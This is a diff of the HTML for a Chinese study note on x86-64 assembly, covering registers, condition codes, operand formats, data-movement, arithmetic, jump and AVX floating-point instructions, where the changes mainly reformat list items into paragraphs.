@@ -3,109 +3,135 @@
 <li>字节，8位，汇编后缀为 <code>b</code></li>
 <li>字（word）表示 16 位，2 字节，汇编后缀为 <code>w</code></li>
 <li>双字（double words）表示 32 位，4 字节，汇编后缀为 <code>l</code></li>
-<li>四字（quad words）表示 64 位，8 字节，汇编后缀为 <code>q</code>
-浮点数使用单独的指令集，和上述一般的数据有所不同</li>
+<li>四字（quad words）表示 64 位，8 字节，汇编后缀为 <code>q</code></li>
+</ul>
+<p>浮点数使用单独的指令集，和上述一般的数据有所不同</p>
+<ul>
 <li>单精度（float），32 位，4 字节，汇编后缀为 <code>s</code></li>
 <li>双精度（double），64 位，8 字节，汇编后缀位 <code>l</code></li>
 </ul>
 <h2 id="ji-cun-qi" tabindex="-1">寄存器</h2>
-<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b710866f7d.png" style="transform: scale(1)" width=1107 height=1256></div>
-总的来说是 16 个寄存器，每个寄存器又分 4 个具体的寄存器，可以分别访问低 8、低 16、低 32、低 64 位的数据
-此外 CPU 中还有一些条件码寄存器，主要配合控制指令来使用。条件码寄存器只存储一个位：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b710866f7d.png" style="transform: scale(1)" width=1107 height=1256></div></p>
+<p>总的来说是 16 个寄存器，每个寄存器又分 4 个具体的寄存器，可以分别访问低 8、低 16、低 32、低 64 位的数据</p>
+<p>此外 CPU 中还有一些条件码寄存器，主要配合控制指令来使用。条件码寄存器只存储一个位：</p>
 <ul>
 <li><code>CF</code>：进位标志。对于整数操作，表示最近的操作的最高位是否产生了进位，可用来检查无符号操作的溢出。对于浮点运算，如果运算结果是负数，或是有一个操作数是 NaN 的话就设置为 1</li>
 <li><code>ZF</code>：零标志。对于整数操作，表示最近的操作结果是否为 0。对于浮点运算，如果运算结果为 0 或是有一个操作数是 NaN 的话就设置为 1</li>
 <li><code>SF</code>：符号标志，表示最近的操作结果是否为负数</li>
 <li><code>OF</code>：溢出标志，表示最近的操作是否导致一个补码发生了正溢出或者负溢出</li>
-<li><code>PF</code>：奇偶标志位。对于整数操作，如果最近的操作结果是偶校验的（即含有偶数个二进制 1），则设置为 1。对于浮点运算，如果有一个操作数是 NaN 的话就设置为 1
-一般情况下算数指令执行后就会设置条件码，但有如下的注意：</li>
+<li><code>PF</code>：奇偶标志位。对于整数操作，如果最近的操作结果是偶校验的（即含有偶数个二进制 1），则设置为 1。对于浮点运算，如果有一个操作数是 NaN 的话就设置为 1</li>
+</ul>
+<p>一般情况下算数指令执行后就会设置条件码，但有如下的注意：</p>
+<ul>
 <li><code>leaq</code> 指令不设置条件码</li>
 <li><code>xor</code> 指令不设置 <code>CF</code> 和 <code>OF</code></li>
 <li>所有的移位操作，<code>CF</code> 为最后一个被移出的位，<code>OF</code> 被设置为 0</li>
-<li><code>inc</code> 和 <code>dec</code> 只设置 <code>OF</code> 和 <code>ZF</code>，不设置 <code>CF</code>
-还有一些特殊的寄存器：</li>
-<li><code>%rip</code> 又称为 PC ，程序计数器，存放将要执行的下一条指令在内存中的地址
-AVX 浮点体系架构还提供如下的寄存器：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c98eff3c66.png" style="transform: scale(1)" width=963 height=1296></div>
-这些寄存器主要用来存储向量，如每个 ymm 寄存器可以存放 8 个32 位值，或是 4 个64 位值，浮点数和整数都可以。不过如果单纯用来进行单个浮点数运算的话，只需要用到 xmm 寄存器的低 32 或 64 位</li>
+<li><code>inc</code> 和 <code>dec</code> 只设置 <code>OF</code> 和 <code>ZF</code>，不设置 <code>CF</code></li>
 </ul>
+<p>还有一些特殊的寄存器：</p>
+<ul>
+<li><code>%rip</code> 又称为 PC ，程序计数器，存放将要执行的下一条指令在内存中的地址</li>
+</ul>
+<p>AVX 浮点体系架构还提供如下的寄存器：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c98eff3c66.png" style="transform: scale(1)" width=963 height=1296></div></p>
+<p>这些寄存器主要用来存储向量，如每个 ymm 寄存器可以存放 8 个32 位值，或是 4 个64 位值，浮点数和整数都可以。不过如果单纯用来进行单个浮点数运算的话，只需要用到 xmm 寄存器的低 32 或 64 位</p>
 <h2 id="cao-zuo-shu" tabindex="-1">操作数</h2>
 <ul>
 <li>立即数，以 <code>$</code> 开头随后接一个 C 语言中可以表示的整数字面量，如 <code>$-577</code>、<code>$0x1F</code></li>
 <li>寄存器，以 <code>%</code> 开头随后接寄存器的名称</li>
-<li>内存引用，完整的格式是 <code>Imm(rb,ri,s)</code>，表示的地址为 <code>Imm+rb+s*ri</code>，我们其中 <code>Imm</code> 是一个数字，<code>rb</code> 和 <code>ri</code> 是寄存器，<code>s</code> 是一个只能为 1 2 4 8 的数字。我们把 <code>rb</code> 称为基址寄存器，<code>Imm</code> 称为偏移，<code>ri</code> 称为变址寄存器，<code>s</code> 称为比例因子
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b731de5f78.png" style="transform: scale(1)" width=1226 height=499></div></li>
+<li>内存引用，完整的格式是 <code>Imm(rb,ri,s)</code>，表示的地址为 <code>Imm+rb+s*ri</code>，我们其中 <code>Imm</code> 是一个数字，<code>rb</code> 和 <code>ri</code> 是寄存器，<code>s</code> 是一个只能为 1 2 4 8 的数字。我们把 <code>rb</code> 称为基址寄存器，<code>Imm</code> 称为偏移，<code>ri</code> 称为变址寄存器，<code>s</code> 称为比例因子</li>
 </ul>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b731de5f78.png" style="transform: scale(1)" width=1226 height=499></div></p>
 <h2 id="zhi-ling" tabindex="-1">指令</h2>
 <h3 id="shu-ju-chuan-song-zhi-ling" tabindex="-1">数据传送指令</h3>
-<p>源和目的的数据大小都一致情况：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b74fb53189.png" style="transform: scale(1)" width=805 height=301></div>
-有几个注意点：</p>
+<p>源和目的的数据大小都一致情况：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b74fb53189.png" style="transform: scale(1)" width=805 height=301></div></p>
+<p>有几个注意点：</p>
 <ul>
 <li>如果选用寄存器，寄存器的大小要和指令后缀相符合</li>
 <li>x86-64 要求传送指令的两个操作数不能够都是访问内存</li>
 <li>使用 <code>movl</code> 传送完双字之后，该寄存器所对应的 64 位寄存器的高 4 字部分置 0</li>
 <li>使用 <code>movq</code> 的话，立即数只能是 32 位的，传送时是将 32 位立即数进行符号扩展再传过去</li>
-<li><code>movabsq</code> 则可以直接使用 64 位的立即数，但也只能使用立即数，并且传送目标只能是寄存器
-小数据传到大数据的传送指令有两种：一种进行零扩展一种进行符号扩展
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b786aa7e94.png" style="transform: scale(1)" width=1071 height=346></div>
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b7887550b2.png" style="transform: scale(1)" width=1152 height=473></div></li>
-<li>上面不存在 <code>movzlq</code>，是因为 <code>movl</code> 在传送后自动清空高 4 字节，达到了 <code>movzlq</code> 的目的</li>
-<li><code>cltq</code> 无需指定操作数，他和 <code>movslq %eax,%rax</code> 一致，但是编码更加紧凑
-C 语言中，如果进行强制数据类型转换的时候既涉及大小变化又涉及符号变化时，应先改变大小。比如一个 <code>unsigned char</code> 转 <code>int</code> 的话，应该是零扩展到 32 位，而并非是符号扩展到 32 位</li>
+<li><code>movabsq</code> 则可以直接使用 64 位的立即数，但也只能使用立即数，并且传送目标只能是寄存器</li>
 </ul>
+<p>小数据传到大数据的传送指令有两种：一种进行零扩展一种进行符号扩展</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b786aa7e94.png" style="transform: scale(1)" width=1071 height=346></div></p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b7887550b2.png" style="transform: scale(1)" width=1152 height=473></div></p>
+<ul>
+<li>上面不存在 <code>movzlq</code>，是因为 <code>movl</code> 在传送后自动清空高 4 字节，达到了 <code>movzlq</code> 的目的</li>
+<li><code>cltq</code> 无需指定操作数，他和 <code>movslq %eax,%rax</code> 一致，但是编码更加紧凑</li>
+</ul>
+<p>C 语言中，如果进行强制数据类型转换的时候既涉及大小变化又涉及符号变化时，应先改变大小。比如一个 <code>unsigned char</code> 转 <code>int</code> 的话，应该是零扩展到 32 位，而并非是符号扩展到 32 位</p>
 <h3 id="suan-shu-zhi-ling" tabindex="-1">算数指令</h3>
 <h4 id="jia-zai-you-xiao-di-zhi" tabindex="-1">加载有效地址</h4>
 <p>格式为 <code>leaq S,D</code>，这个指令的 <code>S</code> 部分必须是一个内存引用格式，其作用类似传送指令，把 <code>S</code> 表示的地址传送到 <code>D</code> 中。实际中这个指令和内存地址关系不大，只是单纯的计算数字，如：<code>leaq 7(%rdx,%rdx,4),%rax</code> 就相当于将 <code>%rax</code> 变为 <code>7+5%rax</code></p>
 <h4 id="yi-yuan-cao-zuo-he-er-yuan-cao-zuo" tabindex="-1">一元操作和二元操作</h4>
-<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b7b65856f0.png" style="transform: scale(1)" width=828 height=176></div>
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b7b81a33ed.png" style="transform: scale(1)" width=810 height=248></div></p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b7b65856f0.png" style="transform: scale(1)" width=828 height=176></div></p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b7b81a33ed.png" style="transform: scale(1)" width=810 height=248></div></p>
 <ul>
-<li>上面的所有指令都需要添加后缀，比如 <code>addq</code></li>
-<li>同样地，操作数不能同时是内存</li>
-<li>对于不符合交换律的运算，如 <code>sub</code>，一定是后面的操作数在前</li>
+<li>
+<p>上面的所有指令都需要添加后缀，比如 <code>addq</code></p>
+</li>
+<li>
+<p>同样地，操作数不能同时是内存</p>
+</li>
+<li>
+<p>对于不符合交换律的运算，如 <code>sub</code>，一定是后面的操作数在前</p>
+</li>
 </ul>
 <h4 id="yi-wei-cao-zuo" tabindex="-1">移位操作</h4>
-<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b7cd55dffa.png" style="transform: scale(1)" width=810 height=187></div>
-其中 <code>k</code> 为移位量，<code>D</code> 表示要作用的目标</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b7cd55dffa.png" style="transform: scale(1)" width=810 height=187></div></p>
+<p>其中 <code>k</code> 为移位量，<code>D</code> 表示要作用的目标</p>
 <ul>
 <li><code>k</code> 必须是一个立即数，或是单字节寄存器 <code>%cl</code> 中，其他寄存器不可以</li>
 <li>上述的指令同样需要添加后缀。只要求 <code>D</code> 作为寄存器时大小和后缀相符即可</li>
 <li>如果 <code>k</code> 使用 <code>%cl</code> 的话，如果 <code>D</code> 的位长为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>，那么位移量由 <code>%cl</code> 的低 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 位决定，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>m</mi></msup><mo>=</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">2^m=w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>，高位部分会被忽略。比如 <code>%cl</code> 为 <code>0xFF</code> 的话，<code>salb</code> 会移动 7 位，<code>salw</code> 会移动 15 位，<code>sall</code> 会移动 31 位，<code>salq</code> 会移动 63 位</li>
 </ul>
 <h4 id="128-wei-yun-suan" tabindex="-1">128 位运算</h4>
-<p>Intel 把 16 字节的数称为八字（oct word）。为了表示 128 位的数据，我们规定 <code>%rdx</code> 存高 64 位，<code>%rax</code> 存低 64 位，然后我们有如下指令：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b8164d6a18.png" style="transform: scale(1)" width=1103 height=466></div></p>
+<p>Intel 把 16 字节的数称为八字（oct word）。为了表示 128 位的数据，我们规定 <code>%rdx</code> 存高 64 位，<code>%rax</code> 存低 64 位，然后我们有如下指令：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b8164d6a18.png" style="transform: scale(1)" width=1103 height=466></div></p>
 <ul>
-<li>注意 <code>mulq</code> 只有一个操作数，区别于上面有两个操作数的 <code>mulq</code></li>
-<li><code>divq</code> 和 <code>idivq</code> 指令执行后会分别把除数和余数放到两个寄存器中</li>
-<li>实际上对于非 128 位的数据进行除法或者取模运算的话也需要使用 <code>idivq</code> 和 <code>divq</code> 指令。这些数据在进行 <code>div</code> 指令前需要先通过 <code>clto</code> 指令来把自身符号扩展到 128 位</li>
+<li>
+<p>注意 <code>mulq</code> 只有一个操作数，区别于上面有两个操作数的 <code>mulq</code></p>
+</li>
+<li>
+<p><code>divq</code> 和 <code>idivq</code> 指令执行后会分别把除数和余数放到两个寄存器中</p>
+</li>
+<li>
+<p>实际上对于非 128 位的数据进行除法或者取模运算的话也需要使用 <code>idivq</code> 和 <code>divq</code> 指令。这些数据在进行 <code>div</code> 指令前需要先通过 <code>clto</code> 指令来把自身符号扩展到 128 位</p>
+</li>
 </ul>
 <h3 id="kong-zhi-zhi-ling" tabindex="-1">控制指令</h3>
 <h4 id="jin-she-zhi-tiao-jian-ma" tabindex="-1">仅设置条件码</h4>
-<p><code>cmp</code> 和 <code>test</code> 指令分别基于减法和按位与运算，但是只设置条件码
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b880699f9f.png" style="transform: scale(1)" width=638 height=623></div>
-比较常见的是，<code>cmp</code> 指令用来判断两个数的大小，<code>test</code> 传递两个相同的操作数来判断这个数字的正负</p>
+<p><code>cmp</code> 和 <code>test</code> 指令分别基于减法和按位与运算，但是只设置条件码</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b880699f9f.png" style="transform: scale(1)" width=638 height=623></div></p>
+<p>比较常见的是，<code>cmp</code> 指令用来判断两个数的大小，<code>test</code> 传递两个相同的操作数来判断这个数字的正负</p>
 <h4 id="fang-wen-tiao-jian-ma" tabindex="-1">访问条件码</h4>
-<p>通常条件码寄存器不会被直接访问，而是通过如下的指令来访问
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b89c34e98a.png" style="transform: scale(1)" width=1061 height=652></div></p>
+<p>通常条件码寄存器不会被直接访问，而是通过如下的指令来访问</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b89c34e98a.png" style="transform: scale(1)" width=1061 height=652></div></p>
 <ul>
-<li>其中注意 <code>l</code> 和 <code>b</code> 的后缀不再表示数据的大小了，而是 less 和 below 的意思</li>
-<li>无需增加后缀，会自动根据目标寄存器的大小推断</li>
-<li>操作数 <code>D</code> 必须是一个单字节寄存器</li>
+<li>
+<p>其中注意 <code>l</code> 和 <code>b</code> 的后缀不再表示数据的大小了，而是 less 和 below 的意思</p>
+</li>
+<li>
+<p>无需增加后缀，会自动根据目标寄存器的大小推断</p>
+</li>
+<li>
+<p>操作数 <code>D</code> 必须是一个单字节寄存器</p>
+</li>
 </ul>
 <h4 id="tiao-zhuan" tabindex="-1">跳转</h4>
-<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b8b540261c.png" style="transform: scale(1)" width=982 height=693></div>
-label 是汇编中的标号，如：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/19/687b8b540261c.png" style="transform: scale(1)" width=982 height=693></div></p>
+<p>label 是汇编中的标号，如：</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="JTA5bW92cSUyMCUyNDAlMkMlMjVyYXglMEElMDlqbXAlMjAuTDElMEElMDltb3ZxJTIwKCUyNXJheCklMkMlMjVyZHglMEEuTDElMEElMDlwb3BxJTIwJTI1cmR4JTBB"><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div></div><div class="code">	movq $0,%rax
 	jmp .L1
 	movq (%rax),%rdx
 .L1
 	popq %rdx
 </div></code></pre>
-<p><code>jmp</code> 还可以有间接跳转，即跳转目标的地址是从寄存器或者内存中读取的，如：<code>jmp *%rax</code> 和 <code>jmp *(%rax)</code>
-跳转指令要跳转到的地址在机器码层面一般有两种编码方式：一种是 PC 相对的，即目标编码为实际地址与当前 PC （当前 PC 是下一条指令的地址）的差值，或者说下一条指令的地址加上跳转指令的地址记为真实跳转到的目标地址；一种是绝对的，即直接写明要跳转到的地址
-跳转指令可以用来实现 C 语言的 if 语句，如：</p>
+<p><code>jmp</code> 还可以有间接跳转，即跳转目标的地址是从寄存器或者内存中读取的，如：<code>jmp *%rax</code> 和 <code>jmp *(%rax)</code></p>
+<p>跳转指令要跳转到的地址在机器码层面一般有两种编码方式：一种是 PC 相对的，即目标编码为实际地址与当前 PC （当前 PC 是下一条指令的地址）的差值，或者说下一条指令的地址加上跳转指令的地址记为真实跳转到的目标地址；一种是绝对的，即直接写明要跳转到的地址</p>
+<p>跳转指令可以用来实现 C 语言的 if 语句，如：</p>
 <pre><div class="head"><div class="language">c</div><div class="copy" data="aWYlMjAodGVzdC1leHByKSUwQSUwOXRoZW4tc3RhdGVtZW50JTBBZWxzZSUwQSUyMCUyMCUyMCUyMGVsc2Utc3RhdGVtZW50JTBB"><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div></div><div class="code"><span class="hljs-keyword">if</span> (test-expr)
 	then-statement
 <span class="hljs-keyword">else</span>
@@ -123,45 +149,45 @@ done:
 </div></code></pre>
 <p>有意思的是汇编的测试条件和 C 的正好相反</p>
 <h4 id="tiao-jian-chuan-song" tabindex="-1">条件传送</h4>
-<p>上面的跳转可能会影响处理器性能，因为现代处理器是流水线化工作的，一条指令的执行被拆成了好几步，上一条指令还没执行完毕就同时执行下一条指令。如果程序是顺序结构的话，那么处理器在执行的时候会将指令填满流水线。而当遇到分支的时候，处理器无法得知后续要执行的指令，流水线则会空闲。处理器为了保持流水线充满，会对分支进行预测，预测后续执行的指令，但是如果预测失败，则需要很大的惩罚回退已经执行的操作。
-部分分支情况可以使用条件传送进行优化。这种优化会把两个分支都进行计算，然后在最后根据条件选择要选用的值：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c37e41d29b.png" style="transform: scale(1)" width=990 height=693></div>
-只有满足相应的条件，才会进行传送</p>
+<p>上面的跳转可能会影响处理器性能，因为现代处理器是流水线化工作的，一条指令的执行被拆成了好几步，上一条指令还没执行完毕就同时执行下一条指令。如果程序是顺序结构的话，那么处理器在执行的时候会将指令填满流水线。而当遇到分支的时候，处理器无法得知后续要执行的指令，流水线则会空闲。处理器为了保持流水线充满，会对分支进行预测，预测后续执行的指令，但是如果预测失败，则需要很大的惩罚回退已经执行的操作。</p>
+<p>部分分支情况可以使用条件传送进行优化。这种优化会把两个分支都进行计算，然后在最后根据条件选择要选用的值：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c37e41d29b.png" style="transform: scale(1)" width=990 height=693></div></p>
+<p>只有满足相应的条件，才会进行传送</p>
 <ul>
 <li><code>S</code> 只能是寄存器或者内存，<code>R</code> 只能为寄存器</li>
 <li>不支持单个字节的传送</li>
-<li>无需增加后缀，会自动根据目标寄存器的大小推断
-C 语言中使用三目表达式可能会更容易让编译器使用条件传送指令
-有些情况下，有可能把两个分支的值都计算完毕之后比分支预测失败带来的惩罚还高，那么编译器就不会选用条件传送
-如果分支并非单纯的计算值，而是可能有副作用，那么也不会选择条件传送
-如：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3ef194cf0.png" style="transform: scale(1)" width=797 height=124></div>
-看起来可以用条件传送，但是如果 <code>xp</code> 真的为空指针的话，提前计算 <code>*xp</code> 会导致空指针异常</li>
+<li>无需增加后缀，会自动根据目标寄存器的大小推断</li>
 </ul>
+<p>C 语言中使用三目表达式可能会更容易让编译器使用条件传送指令</p>
+<p>有些情况下，有可能把两个分支的值都计算完毕之后比分支预测失败带来的惩罚还高，那么编译器就不会选用条件传送</p>
+<p>如果分支并非单纯的计算值，而是可能有副作用，那么也不会选择条件传送</p>
+<p>如：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c3ef194cf0.png" style="transform: scale(1)" width=797 height=124></div></p>
+<p>看起来可以用条件传送，但是如果 <code>xp</code> 真的为空指针的话，提前计算 <code>*xp</code> 会导致空指针异常</p>
 <h3 id="fu-dian-xiang-guan" tabindex="-1">浮点相关</h3>
 <h4 id="fu-dian-chuan-song" tabindex="-1">浮点传送</h4>
-<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c9ae817dbe.png" style="transform: scale(1)" width=1563 height=502></div>
-其中 <code>X</code> 只能选择 XMM 寄存器，<code>M</code> 只能选择内存
-如果浮点运算涉及到了立即数，那么需要由编译器先把立即数写到 rodata 段，然后从内存引用</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c9ae817dbe.png" style="transform: scale(1)" width=1563 height=502></div></p>
+<p>其中 <code>X</code> 只能选择 XMM 寄存器，<code>M</code> 只能选择内存</p>
+<p>如果浮点运算涉及到了立即数，那么需要由编译器先把立即数写到 rodata 段，然后从内存引用</p>
 <h4 id="zhuan-huan-cao-zuo" tabindex="-1">转换操作</h4>
-<p><strong>浮点转整数</strong>
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c9c0c23a8f.png" style="transform: scale(1)" width=1564 height=466></div>
-截断会向 0 舍入
-<strong>整数转浮点</strong>
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c9c575c7d9.png" style="transform: scale(1)" width=1550 height=452></div>
-一般源 2 和目的一致
-<strong>单精度到双精度</strong>
-如果想把单精度数据转成双精度数据的话，可以使用 <code>vcvtss2sd</code> 指令，如 <code>vcvtss2sd %xmm0,%xmm0,%xmm0</code> 即可把 <code>%xmm0</code> 的单精度变为双精度
-不过 GCC 生成如下的代码</p>
+<p><strong>浮点转整数</strong></p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c9c0c23a8f.png" style="transform: scale(1)" width=1564 height=466></div></p>
+<p>截断会向 0 舍入</p>
+<p><strong>整数转浮点</strong></p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687c9c575c7d9.png" style="transform: scale(1)" width=1550 height=452></div></p>
+<p>一般源 2 和目的一致</p>
+<p><strong>单精度到双精度</strong></p>
+<p>如果想把单精度数据转成双精度数据的话，可以使用 <code>vcvtss2sd</code> 指令，如 <code>vcvtss2sd %xmm0,%xmm0,%xmm0</code> 即可把 <code>%xmm0</code> 的单精度变为双精度</p>
+<p>不过 GCC 生成如下的代码</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="dnVucGNrbHBzJTIwJTI1eG1tMCUyQyUyNXhtbTAlMkMlMjV4bW0wJTBBdmN2dHBzMnBkJTIwJTI1eG1tMCUyQyUyNXhtbTAlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div></div><div class="code">vunpcklps %xmm0,%xmm0,%xmm0
 vcvtps2pd %xmm0,%xmm0
 </div></code></pre>
-<p><code>vunpcklps</code> 将两个 xmm 寄存器的值交叉放置，然后把结果放到第三个寄存器。比如第一个寄存器的内容为字 <code>[s3,s2,s1,s0]</code>，另一个寄存器的内容为字 <code>[d3,d2.d1,d0]</code> ，那么目标寄存器的值会变为 <code>[s1,d1,s0,d0]</code>。那么对于上面这个指令，如果 <code>%xmm0</code> 的值为字 <code>[x3,x2,x1,x0]</code> 的话那么 <code>%xmm0</code> 会变为 <code>[x1,x1,x0,x0]</code>。
-<code>vcvtps2pd</code> 会将源寄存器的两个低位的单精度值扩展成 xmm 寄存器中的两个双精度值。对于上面这个例子，最终 <code>%xmm0</code> 变为 <code>[dx0,dx0]</code>
-那么上述两个指令合起来的效果就是把 <code>%xmm0</code> 低 32 位表示的单精度浮点数转为两个一样的双精度
-这样做不会有什么好处，GCC 这么做的原因也不明
-<strong>双精度到单精度</strong>
-可以使用 <code>vcvtsd2ss %xmm0,%xmm0,%xmm0</code> 指令，但是 GCC 产生如下的代码：</p>
+<p><code>vunpcklps</code> 将两个 xmm 寄存器的值交叉放置，然后把结果放到第三个寄存器。比如第一个寄存器的内容为字 <code>[s3,s2,s1,s0]</code>，另一个寄存器的内容为字 <code>[d3,d2.d1,d0]</code> ，那么目标寄存器的值会变为 <code>[s1,d1,s0,d0]</code>。那么对于上面这个指令，如果 <code>%xmm0</code> 的值为字 <code>[x3,x2,x1,x0]</code> 的话那么 <code>%xmm0</code> 会变为 <code>[x1,x1,x0,x0]</code>。</p>
+<p><code>vcvtps2pd</code> 会将源寄存器的两个低位的单精度值扩展成 xmm 寄存器中的两个双精度值。对于上面这个例子，最终 <code>%xmm0</code> 变为 <code>[dx0,dx0]</code></p>
+<p>那么上述两个指令合起来的效果就是把 <code>%xmm0</code> 低 32 位表示的单精度浮点数转为两个一样的双精度</p>
+<p>这样做不会有什么好处，GCC 这么做的原因也不明</p>
+<p><strong>双精度到单精度</strong></p>
+<p>可以使用 <code>vcvtsd2ss %xmm0,%xmm0,%xmm0</code> 指令，但是 GCC 产生如下的代码：</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="dm1vdmRkdXAlMjAlMjV4bW0wJTJDJTI1eG1tMCUwQXZjdnRwZDJwc3glMjAlMjV4bW0wJTJDJTI1eG1tMCUwQQ=="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div></div><div class="code">vmovddup %xmm0,%xmm0
 vcvtpd2psx %xmm0,%xmm0
 </div></code></pre>
@@ -170,116 +196,219 @@ vcvtpd2psx %xmm0,%xmm0
 <p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687ca0c0812c3.png" style="transform: scale(1)" width=1552 height=529></div></p>
 <ul>
 <li>第一个操作数 <code>S1</code> 必须是 xmm 寄存器或者是内存</li>
-<li>第二个操作数和目的都必须是 xmm 寄存器
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687ca1d00c8ec.png" style="transform: scale(1)" width=1557 height=242></div></li>
+<li>第二个操作数和目的都必须是 xmm 寄存器</li>
+</ul>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/20/687ca1d00c8ec.png" style="transform: scale(1)" width=1557 height=242></div></p>
+<ul>
 <li>源和目的都必须是 xmm 寄存器</li>
 </ul>
 <h4 id="bi-jiao-cao-zuo" tabindex="-1">比较操作</h4>
